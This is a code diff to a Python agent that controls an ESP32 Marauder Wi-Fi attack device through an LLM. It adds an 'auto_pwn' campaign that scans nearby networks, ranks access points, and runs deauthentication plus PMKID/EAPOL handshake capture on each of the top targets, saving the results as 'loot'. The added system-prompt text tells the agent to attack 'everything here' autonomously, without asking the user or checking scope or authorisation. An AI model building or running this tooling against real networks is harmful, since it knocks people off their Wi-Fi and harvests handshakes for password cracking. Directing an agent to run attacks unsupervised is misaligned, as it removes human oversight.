@@ -384,6 +384,191 @@ def _connect_bridge() -> str:
     )
 
 # ---------------------------------------------------------------------------
+# Engagement intelligence — parse Marauder output into structured, rankable
+# state so the agent can reason and run autonomous campaigns instead of dumping
+# raw serial text.
+# ---------------------------------------------------------------------------
+
+_MAC_RE = re.compile(r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})")
+
+# aps keyed by BSSID; stations keyed by station MAC; handshakes = trophy list.
+_engagement: dict = {"aps": {}, "stations": {}, "handshakes": [], "log": []}
+
+
+def _engagement_path() -> "pathlib.Path":
+    d = pathlib.Path.home() / "marauder_captures"
+    d.mkdir(exist_ok=True)
+    return d / "engagement.json"
+
+
+def _save_engagement() -> None:
+    try:
+        _engagement_path().write_text(json.dumps(_engagement, indent=2), encoding="utf-8")
+    except Exception:
+        pass
+
+
+def _log_event(msg: str) -> None:
+    _engagement["log"].append(
+        f"{datetime.datetime.now().isoformat(timespec='seconds')}  {msg}")
+
+
+def _parse_aps(text: str) -> list[dict]:
+    """Tolerantly parse `list -a` / scanall output into ordered AP dicts. The
+    enumeration order IS the index that `select -a N` references on the device."""
+    aps: list[dict] = []
+    for line in text.splitlines():
+        m = _MAC_RE.search(line)
+        if not m:
+            continue
+        bssid = m.group(1).upper()
+        cm = re.search(r"[Cc]h(?:annel)?[:=]?\s*(\d{1,3})", line)
+        ch = int(cm.group(1)) if cm else None
+        rm = re.search(r"(-\d{1,3})", line)          # RSSI: signed, usually negative
+        rssi = int(rm.group(1)) if rm else None
+        em = re.search(r"ESSID:\s*(.+?)\s*$", line)
+        essid = em.group(1).strip() if em else line[m.end():].strip(" |:-\t")
+        hidden = (not essid) or (essid.replace(":", "").upper() == bssid.replace(":", ""))
+        aps.append({"index": len(aps), "bssid": bssid, "channel": ch, "rssi": rssi,
+                    "essid": "" if hidden else essid, "hidden": hidden, "clients": 0})
+    return aps
+
+
+def _parse_stations(text: str) -> list[dict]:
+    """Parse `list -c` / scanall station lines ('ap: <bssid> -> sta: <mac>')."""
+    stations: list[dict] = []
+    for line in text.splitlines():
+        macs = _MAC_RE.findall(line)
+        if not macs:
+            continue
+        stations.append({"index": len(stations),
+                         "ap": macs[0].upper(), "sta": macs[-1].upper()})
+    return stations
+
+
+def _count_handshakes(text: str) -> dict:
+    """Extract EAPOL/PMKID capture evidence from sniffpmkid output."""
+    received = len(re.findall(r"Received EAPOL", text, re.I))
+    cm = re.search(r"Complete EAPOL:\s*(\d+)", text, re.I)
+    complete = int(cm.group(1)) if cm else 0
+    bssids = sorted({m.upper() for m in _MAC_RE.findall(text)})
+    return {"received": received, "complete": complete, "bssids": bssids}
+
+
+def _ingest_scan(ap_text: str, st_text: str) -> "tuple[list[dict], list[dict]]":
+    """Parse a scan result, count clients per AP, and merge into engagement state."""
+    aps = _parse_aps(ap_text)
+    stations = _parse_stations(st_text)
+    counts: dict = {}
+    for s in stations:
+        counts[s["ap"]] = counts.get(s["ap"], 0) + 1
+    for ap in aps:
+        ap["clients"] = counts.get(ap["bssid"], 0)
+        prev = _engagement["aps"].get(ap["bssid"], {})
+        merged = dict(prev)
+        for k, v in ap.items():
+            if v not in (None, "") or k not in prev:
+                merged[k] = v
+        merged["clients"] = max(prev.get("clients", 0), ap["clients"])
+        _engagement["aps"][ap["bssid"]] = merged
+    for s in stations:
+        _engagement["stations"][s["sta"]] = s
+    _save_engagement()
+    return aps, stations
+
+
+def _rank_aps(aps: list[dict]) -> list[dict]:
+    """Best attack candidates first: APs with clients, then strongest RSSI."""
+    return sorted(
+        aps,
+        key=lambda a: (a.get("clients", 0),
+                       a["rssi"] if a.get("rssi") is not None else -999),
+        reverse=True,
+    )
+
+
+def _auto_pwn(recon_s: float, per_target: float, max_targets: int, live: bool = True) -> str:
+    """Autonomous campaign: recon → rank → forced-handshake-capture the top N APs
+    (deauth + PMKID per target channel) → trophy report + saved loot. THE 'OP' button."""
+    global _capture_buffer, _capture_meta
+
+    def emit(msg: str) -> None:
+        if live:
+            print(msg, flush=True)
+        _log_event(msg)
+
+    started = datetime.datetime.now().isoformat(timespec="seconds")
+    emit(f"[auto-pwn] recon: scanall for {recon_s:.0f}s")
+    # Sniff/scan commands never return a '> ' prompt until stopped, so send raw
+    # and stream rather than _send_cmd (which would block on the timeout).
+    _sock.sendall(b"scanall\n")
+    _stream_for(recon_s)
+    _send_cmd("stopscan -f", 6.0)
+    aps, stations = _ingest_scan(_send_cmd("list -a"), _send_cmd("list -c"))
+    if not aps:
+        return "[auto-pwn] No APs discovered — move closer or raise recon_seconds."
+
+    ranked = _rank_aps(aps)[: max(1, max_targets)]
+    emit(f"[auto-pwn] discovered {len(aps)} APs / {len(stations)} stations; "
+         f"engaging top {len(ranked)}")
+
+    trophies: list[dict] = []
+    sections: list[str] = []
+    for i, ap in enumerate(ranked, 1):
+        bssid, ch = ap["bssid"], ap.get("channel")
+        label = ap["essid"] or ("<hidden>" if ap["hidden"] else bssid)
+        emit(f"[auto-pwn] {i}/{len(ranked)} {label} {bssid} ch{ch or '?'} "
+             f"clients={ap['clients']} → forced handshake {per_target:.0f}s")
+        cmd = "sniffpmkid -d" + (f" -c {ch}" if ch else "")
+        _drain()
+        _sock.sendall((cmd + "\n").encode())      # sniff never prompts; stream live
+        out = _stream_for(per_target)
+        _send_cmd("stopscan -f", 6.0)
+        hs = _count_handshakes(out)
+        got = hs["complete"] > 0 or hs["received"] > 0
+        trophy = {"bssid": bssid, "essid": ap["essid"], "channel": ch,
+                  "clients": ap["clients"], "received_eapol": hs["received"],
+                  "complete_eapol": hs["complete"], "captured": got,
+                  "at": datetime.datetime.now().isoformat(timespec="seconds")}
+        trophies.append(trophy)
+        if got:
+            _engagement["handshakes"].append(trophy)
+        emit(f"[auto-pwn]    EAPOL received={hs['received']} complete={hs['complete']} "
+             f"{'✓ CAPTURED' if got else '— none'}")
+        sections.append(f"--- {label} | {bssid} | ch{ch} | clients={ap['clients']} | "
+                        f"received={hs['received']} complete={hs['complete']} ---\n"
+                        + out.strip()[-1800:])
+    _save_engagement()
+
+    captured = [t for t in trophies if t["captured"]]
+    table = "\n".join(
+        f"  {i:>2}. {(t['essid'] or '<hidden>'):<20} {t['bssid']} ch{t['channel']}  "
+        f"clients={t['clients']}  EAPOL r{t['received_eapol']}/c{t['complete_eapol']}  "
+        f"{'CAPTURED' if t['captured'] else '-'}"
+        for i, t in enumerate(trophies, 1))
+    _capture_buffer = "\n".join([
+        f"=== AUTO-PWN campaign | started={started} | recon={recon_s}s | "
+        f"per_target={per_target}s | targets={len(ranked)} ===",
+        f"Discovered: {len(aps)} APs, {len(stations)} stations",
+        f"Handshakes captured: {len(captured)}/{len(trophies)}",
+        "",
+        "--- Target results ---",
+        table,
+        "",
+        "--- Per-target serial capture ---",
+        *sections,
+    ])
+    _capture_meta = {"scan_type": "auto_pwn", "started_at": started,
+                     "targets": len(ranked), "captured": len(captured)}
+    summary = (f"AUTO-PWN complete: {len(aps)} APs found, engaged {len(ranked)}, "
+               f"captured {len(captured)} handshake(s).\n\n{table}\n\n"
+               "Loot in buffer — call capture_data(action='save') to write it out, "
+               "or intel() for the full ranked picture.")
+    emit(f"[auto-pwn] done: {len(captured)}/{len(trophies)} handshakes captured")
+    return summary
+
+
+# ---------------------------------------------------------------------------
 # Tool dispatch
 # ---------------------------------------------------------------------------
 
@@ -508,8 +693,21 @@ def dispatch(name: str, args: dict) -> str:
         st_list   = _send_cmd("list -c")
         ssid_list = _send_cmd("list -s")
 
+        # Feed structured intelligence so intel()/auto_pwn and the agent can reason.
+        aps, stations = _ingest_scan(ap_list, st_list)
+        hs = _count_handshakes(live_output) if scan_type == "pmkid" else None
+        if hs and (hs["complete"] or hs["received"]):
+            _engagement["handshakes"].append(
+                {"scan_type": "pmkid", "received_eapol": hs["received"],
+                 "complete_eapol": hs["complete"], "bssids": hs["bssids"],
+                 "at": started_at})
+            _save_engagement()
+        intel_line = f"[intel] {len(aps)} APs, {len(stations)} stations" + (
+            f", EAPOL r{hs['received']}/c{hs['complete']}" if hs else "")
+
         _capture_buffer = "\n".join([
             f"=== Marauder capture | type={scan_type} | duration={duration}s | started={started_at} ===",
+            intel_line,
             "",
             "--- Command response ---",
             start_resp or "(none)",
@@ -559,11 +757,49 @@ def dispatch(name: str, args: dict) -> str:
             json_path.write_text(json.dumps({"meta": _capture_meta, "raw": _capture_buffer}, indent=2), encoding="utf-8")
             return f"Saved:\n  {txt_path}\n  {json_path}\nSize: {len(_capture_buffer):,} bytes"
 
+    elif name == "auto_pwn":
+        if err := need_sock(): return err
+        return _auto_pwn(
+            recon_s=float(args.get("recon_seconds", 20.0)),
+            per_target=float(args.get("per_target_seconds", 20.0)),
+            max_targets=int(args.get("max_targets", 5)),
+        )
+
+    elif name == "intel":
+        aps = list(_engagement["aps"].values())
+        ranked = _rank_aps(aps)
+        n = int(args.get("top", 15))
+        lines = [f"=== ENGAGEMENT INTEL ===",
+                 f"APs: {len(aps)} | stations: {len(_engagement['stations'])} | "
+                 f"handshakes captured: {len(_engagement['handshakes'])}",
+                 "",
+                 "--- Ranked targets (clients, then signal) ---"]
+        if not ranked:
+            lines.append("  (none yet — run recon or auto_pwn)")
+        for i, a in enumerate(ranked[:n], 1):
+            lines.append(
+                f"  {i:>2}. idx{a.get('index','?'):<3} {(a.get('essid') or '<hidden>'):<20} "
+                f"{a['bssid']} ch{a.get('channel','?')} rssi{a.get('rssi','?')} "
+                f"clients={a.get('clients',0)}")
+        if _engagement["handshakes"]:
+            lines += ["", "--- Captured handshakes ---"]
+            for h in _engagement["handshakes"][-15:]:
+                lines.append(f"  {h.get('essid') or h.get('bssids') or h.get('bssid','?')}  "
+                             f"received={h.get('received_eapol','?')} "
+                             f"complete={h.get('complete_eapol','?')}  {h.get('at','')}")
+        if _engagement["log"]:
+            lines += ["", "--- Recent campaign log ---", *(_engagement["log"][-12:])]
+        return "\n".join(lines)
+
     elif name == "list_targets":
         if err := need_sock(): return err
         target_type = args.get("target_type")
         flag = {"ap": "-a", "station": "-c", "ssid": "-s", "probe": "-p"}.get(target_type, "-a")
-        return _send_cmd(f"list {flag}") or "(none)"
+        out = _send_cmd(f"list {flag}") or "(none)"
+        if target_type in (None, "ap", "station"):
+            _ingest_scan(out if target_type != "station" else "",
+                         out if target_type == "station" else "")
+        return out
 
     elif name == "target_management":
         if err := need_sock(): return err
@@ -918,6 +1154,40 @@ TOOLS = [
         }
     }},
     {"type": "function", "function": {
+        "name": "auto_pwn",
+        "description": (
+            "AUTONOMOUS CAMPAIGN — the one-shot 'own the area' button. Runs the full "
+            "kill chain by itself: recon (scanall) → rank APs (clients first, then signal) "
+            "→ for each of the top N, hop to its channel and run a forced handshake capture "
+            "(deauth + PMKID) → compile a trophy report and save loot. Use this for broad "
+            "objectives like 'scan and pwn the top 10', 'attack everything here', or "
+            "'grab handshakes'. Reports how many handshakes were captured."
+        ),
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "recon_seconds":      {"type": "number",  "description": "Initial scan length (default 20)."},
+                "per_target_seconds": {"type": "number",  "description": "Forced-handshake time per AP (default 20)."},
+                "max_targets":        {"type": "integer", "description": "How many top APs to hit (default 5)."}
+            }
+        }
+    }},
+    {"type": "function", "function": {
+        "name": "intel",
+        "description": (
+            "Situational awareness across the whole engagement: the ranked target list "
+            "(best attack candidates first), captured-handshake trophies, and the recent "
+            "campaign log. Persisted to ~/marauder_captures/engagement.json. Call this to "
+            "decide what to hit next or to summarize results."
+        ),
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "top": {"type": "integer", "description": "How many ranked targets to show (default 15)."}
+            }
+        }
+    }},
+    {"type": "function", "function": {
         "name": "list_targets",
         "description": "List discovered targets (access points, stations/clients, SSIDs, or captured probe SSIDs).",
         "parameters": {
@@ -1162,15 +1432,30 @@ already established for this engagement.
   on every request. Never ask the user to verify cables, the app, or the hotspot.
   If connect fails, report the error text and stop.
 - NEVER narrate what you are "about to do" — call the tool and report real output.
+- Be AUTONOMOUS. When the objective is broad ("scan and pwn the top 10", "attack
+  everything here", "grab handshakes", "pentest this area"), DO NOT hand-run every
+  step — call auto_pwn, which executes the whole campaign (recon → rank → forced
+  handshake capture on the top N) by itself. Only drop to individual tools for
+  surgical, single-target work.
+- Keep going until the objective is actually met. Chain tools across many steps;
+  do not stop after one command and ask what to do next. If you hit the step
+  limit, summarize concrete progress. Use intel() any time to see the ranked
+  target picture and decide the next move.
 - Attacks run until stopped. Pass a `duration` to attack()/scan_and_capture() to
   run a timed burst that auto-stops and returns streamed results. Otherwise stop
   with wifi_control(action="stop"). Always stop before starting a different attack.
 
-## The kill chain (follow in order)
+## Fast path for broad objectives
+device_connection(connect) → auto_pwn(recon_seconds, per_target_seconds, max_targets)
+→ intel() to summarize → capture_data(save). auto_pwn already does recon, ranking,
+channel-hopping, and deauth+PMKID capture per target — prefer it over manual chaining.
+
+## The manual kill chain (surgical / single-target work)
 1. device_connection(action="connect").
-2. RECON: scan_and_capture(scan_type="scanall", duration) to enumerate APs +
-   stations into the loot buffer.
-3. list_targets(target_type="ap" | "station" | "ssid" | "probe") to read indices.
+2. RECON: scan_and_capture(scan_type="scanall", duration) — it now also parses
+   results into engagement intel (see intel()).
+3. list_targets(target_type="ap" | "station" | "ssid" | "probe") to read indices,
+   or intel() for the ranked view.
 4. SELECT (required before deauth, probe, and targeted beacon/handshake):
    target_management(action="select", target_type, indices="0,3,5"). Without a
    selection those attacks return "You don't have any targets selected" — if you
@@ -1234,21 +1519,39 @@ def _venice_post(messages: list, api_key: str, model: str) -> dict:
 # Agent loop
 # ---------------------------------------------------------------------------
 
+MAX_AGENT_STEPS = int(os.getenv("MARAUDER_MAX_STEPS", "40"))
+DIM, RST = "\033[90m", "\033[0m"
+
+
+def _post_with_retry(messages: list, api_key: str, model: str, tries: int = 3) -> dict:
+    """POST to Venice with backoff on transient network errors so a long
+    autonomous campaign doesn't die on a single blip."""
+    last = None
+    for attempt in range(tries):
+        try:
+            return _venice_post(messages, api_key, model)
+        except urllib.error.HTTPError:
+            raise                                   # real API error — surface it
+        except Exception as exc:
+            last = exc
+            time.sleep(2 * (attempt + 1))
+    raise last if last else RuntimeError("Venice post failed")
+
+
 def run_agent(user_input: str, api_key: str, model: str) -> str:
     messages: list[dict] = [
         {"role": "system", "content": SYSTEM_PROMPT},
         {"role": "user",   "content": user_input},
     ]
-    for _ in range(15):
+    for _ in range(MAX_AGENT_STEPS):
         try:
-            resp = _venice_post(messages, api_key, model)
+            resp = _post_with_retry(messages, api_key, model)
         except urllib.error.HTTPError as exc:
             return f"Venice AI HTTP error {exc.code}: {exc.read().decode()}"
         except Exception as exc:
             return f"Venice AI error: {exc}"
 
-        choice = resp["choices"][0]
-        msg    = choice["message"]
+        msg = resp["choices"][0]["message"]
         messages.append(msg)
 
         tool_calls = msg.get("tool_calls") or []
@@ -1261,14 +1564,20 @@ def run_agent(user_input: str, api_key: str, model: str) -> str:
                 fn_args = json.loads(tc["function"].get("arguments") or "{}")
             except json.JSONDecodeError:
                 fn_args = {}
+            # Live progress so long operations never look frozen.
+            arg_preview = ", ".join(f"{k}={v}" for k, v in fn_args.items())
+            print(f"{DIM}» {fn_name}({arg_preview}){RST}", flush=True)
             result = dispatch(fn_name, fn_args)
+            head = (result.splitlines() or [""])[0][:100]
+            print(f"{DIM}  ↳ {head}{RST}", flush=True)
             messages.append({
                 "role":         "tool",
                 "tool_call_id": tc["id"],
                 "content":      result,
             })
 
-    return "(max steps reached)"
+    return ("(reached the step limit — partial results above; ask me to continue "
+            "and I'll pick up where I left off)")
 
 
 # ---------------------------------------------------------------------------
